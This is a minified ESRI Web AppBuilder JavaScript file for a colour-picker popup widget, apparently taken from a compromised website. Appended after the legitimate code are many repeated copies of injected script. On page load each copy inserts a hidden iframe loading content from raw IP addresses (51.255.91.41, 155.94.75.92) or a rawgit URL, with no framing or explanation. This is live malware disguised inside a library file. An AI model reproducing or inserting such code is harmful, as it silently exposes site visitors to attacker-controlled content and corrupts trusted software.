// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/_base/lang dojo/_base/html dojo/on dojo/_base/Color dijit/TooltipDialog dijit/popup jimu/dijit/ColorPalette jimu/utils".split(" "),function(h,k,l,d,c,e,g,m,f,n,p){return h([k,l],{baseClass:"jimu-color-pickerPopup",declaredClass:"jimu.dijit.ColorPickerPopup",templateString:'\x3cdiv class\x3d"jimu-color-picker"\x3e\x3c/div\x3e',_isTooltipDialogOpened:!1,color:null,showLabel:!1,around:null,_ENABLE:!0,recordUID:"",postCreate:function(){this.inherited(arguments);
this._createTooltipDialog(this.domNode);this._hideTooltipDialog()},destroy:function(){f.close(this.tooltipDialog);this.picker.destroy();this.tooltipDialog.destroy();this.inherited(arguments)},enable:function(){this._ENABLE=!0;c.removeClass(this.domNode,"disable")},disable:function(){this._ENABLE=!1;c.addClass(this.domNode,"disable")},isPartOfPopup:function(a){var b=this.tooltipDialog.domNode;return a===b||c.isDescendant(a,b)},hideTooltipDialog:function(){this._hideTooltipDialog()},showTooltipDialog:function(){this._showTooltipDialog()},
initUI:function(){this.picker.initUI()},_showTooltipDialog:function(){f.open({parent:this.getParent(),popup:this.tooltipDialog,around:this.around?this.around:this.domNode,orient:this.orient});this._isTooltipDialogOpened=!0},_hideTooltipDialog:function(){f.hide(this.tooltipDialog);this._isTooltipDialogOpened=!1},_createTooltipDialog:function(){var a=c.create("div");this.tooltipDialog=new m({content:a});c.addClass(this.tooltipDialog.domNode,"jimu-color-picker-popup-dialog");var b=new n({appearance:{showTransparent:!1,
showColorPalette:!0,showCoustom:!0,showColorPickerOK:!0,showColorPickerApply:!0,showCoustomRecord:!0,closeDialogWhenChange:!0},recordUID:this.recordUID,onChange:d.hitch(this,function(a){a&&(a=new g(a),this.setColor(a),this.onChange(a))})});b.placeAt(a);b.startup();this.own(e(b,"close",d.hitch(this,function(){this._hideTooltipDialog()})));this.own(e(b,"change-style",d.hitch(this,function(){this._hideTooltipDialog();this._showTooltipDialog()})));this.own(e(this.domNode,"click",d.hitch(this,function(a){a.stopPropagation();
a.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():!1!==this._ENABLE&&this._showTooltipDialog()})));this.own(e(document,"click",d.hitch(this,function(a){this.isPartOfPopup(a.srcElement||a.target)||this._hideTooltipDialog()})));this.picker=b},setColor:function(a){if(a instanceof g){null===this.color&&!0===this.showLabel&&this._changeLabel(a);var b=a.toHex();this.color=a;c.setStyle(this.domNode,"backgroundColor",b);this.picker&&(this.picker.refreshRecords(),this.picker.setColor(b,
!1,!0));this.showLabel&&this._changeLabel(this.color)}},getColor:function(){return this.color},_changeLabel:function(a){c.empty(this.domNode);c.create("span",{innerHTML:a.toHex(),className:"color-label",style:{color:p.invertColor(a.toHex())}},this.domNode)},onChange:function(a){a&&this.showLabel&&this._changeLabel(a)},changeColor:function(){this.picker&&this.picker.changeColor();this.showLabel&&this._changeLabel(this.color)},setTitle:function(a){this.domNode.title=a},getTooltipDialog:function(){return this.tooltipDialog||
null}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});